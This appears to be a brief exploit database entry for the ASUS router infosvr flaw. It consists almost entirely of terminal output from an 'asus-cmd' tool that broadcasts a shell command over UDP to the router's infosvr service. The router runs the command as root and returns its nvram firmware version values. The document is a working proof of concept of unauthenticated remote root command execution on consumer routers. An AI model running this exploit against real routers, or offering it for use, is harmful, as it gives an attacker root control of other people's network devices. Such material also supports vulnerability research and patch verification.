ASUS Router infosvr UDP Broadcast root Command Execution
========================================================

```
$ ./asus-cmd "nvram show | grep -E '(firmver|buildno|extendno)'"
[*] opened sd 3 for outgoing comms
[*] opened sd 4 for incoming comms
[*] set SO_BROADCAST on outgoing
[*] set SO_BROADCAST on incoming
[*] sent command: nvram show | grep -E '(firmver|buildno|extendno)'
[!] received 512 bytes from 10.0.0.2:37625
    0c 15 0033 54ab7bc4 41:41:41:41:41:41
    0031 nvram show | grep -E '(firmver|buildno|extendno)'
[!] received 512 bytes from 10.0.0.1:9999
    0c 16 0033 54ab7bc4 xx:xx:xx:xx:xx:xx
    004e buildno=376
extendno_org=2524-g0013f52
extendno=2524-g0013f52
firmver=3.0.0.4
```
